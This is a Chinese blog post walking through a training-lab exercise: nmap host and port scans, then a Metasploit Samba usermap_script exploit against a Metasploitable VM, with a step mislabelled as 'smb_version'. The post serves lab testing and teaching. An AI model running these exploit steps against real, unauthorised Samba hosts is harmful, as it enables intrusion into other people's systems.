---
title: kali 渗透攻击Samba服务
date: 2018-11-27 15:55:54
tags:
---

  公司网站开发需要测试一下教学网站中的实验部分（一人两台实验机器，其中一台为kali，另一台为metasploitable）,看一下是否能正常使用。对kali工具不熟悉，找了几篇博客，并将主要流程记录下来。
<!--more-->

使用postman发送请求，将两台虚拟机镜像的ID封装成json对象。后端接收到数据后，生成对应的虚拟机，打开openstack的dashboard可以看到生成两个虚拟机，信息如下(主要看主机名和IP)：
![](实例信息.png)
后台返回kali的url。将url复制到浏览器中后开始操作。

#### 准备工作
nmap是一款专用的端口扫描工具，主要使用该工具发现局域网中的主机，和主机开放的端口。
- 主机扫描
```
nmap -sP 172.0.0.0-100
```
该命令是扫描发现局域网下IP为172.0.0.0-172.0.0.100下可以ping通的IP,结果如下。
![](主机扫描.png)
由图片可知，已经发现了IP为172.0.0.13的虚拟机。

- 端口扫描
```
nmap -sV 172.0.0.13 -A
```
该命令是发现主机开发的端口，通过扫描可以发现该主机开放了一些存在高危漏洞的端口。
![](端口扫描.png)
上图所示是该主机开放的所有端口，其中知道比较多的139、445等高危端口是开放的。

- 渗透攻击Samba服务
Samba服务对应的端口有139和445等，只要开启这些端口后，主机就有可能存在Samba远程溢出漏洞。以下是攻击步骤：
1. 启动MSF终端
```
msfconsole
```
2. 使用smb_version模块
```
use exploit/multi/samba/usermap_script
```
3. 设置RHOST选项
```
set RHOST 172.0.0.13
```
4. 启动渗透攻击
```
exploit
```
5. 等待完成，如果成功。使用Linux命令查询主机相关信息。例如查询系统当前用户和ip地址
```
whoami
ip address
```
![](渗透攻击.png)
这只是其中的一种漏洞，因为metasploitable是一个人工靶机，所以教程较多，攻击流畅。下面这篇博客里面还包含了其他的一些漏洞和攻击方法，可以参考。
参考链接：[Kali-Linux渗透攻击应用](https://www.cnblogs.com/student-programmer/p/6728594.html)
